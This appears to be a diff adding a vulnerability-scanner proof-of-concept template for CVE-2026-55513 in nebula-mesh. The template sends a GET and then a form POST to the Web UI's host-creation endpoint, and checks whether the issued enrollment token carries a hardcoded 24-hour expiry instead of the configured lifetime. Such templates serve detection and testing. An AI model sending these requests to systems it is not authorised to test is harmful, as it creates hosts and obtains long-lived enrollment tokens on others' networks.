@@ -1,0 +1,57 @@
+[info]
+author = "AVE"
+description = "nebula-mesh Web UI 的 POST /ui/hosts 接口未使用服务端配置的 enrollment_token_ttl 解析器，硬编码 24 小时过期时间。认证操作员可通过 Web UI 创建主机，获取有效期远超配置值的承载注册令牌，延长令牌泄露后的利用窗口。"
+id = "POC-AVE-2026-0621"
+name = "nebula-mesh Web UI 主机创建注册令牌有效期绕过 PoC"
+severity = "medium"
+tags = [
+    "cve-2026-55513",
+    "nebula-mesh",
+    "enrollment-token",
+    "ttl-bypass",
+]
+vuln_id = [
+    "CVE-2026-55513",
+    "GHSA-g4x6-jcvr-9m3g",
+    "GO-2026-5987",
+    "AVE-2026-0621",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/ui/hosts/new"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["csrf"]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/ui/hosts"
+protocol = "http"
+
+[poc.requests.body]
+content = "network_id=test-net&name=test-host&nebula_ips=10.77.0.10&role=host&kind=agent"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "expires_at",
+    "24h",
+]
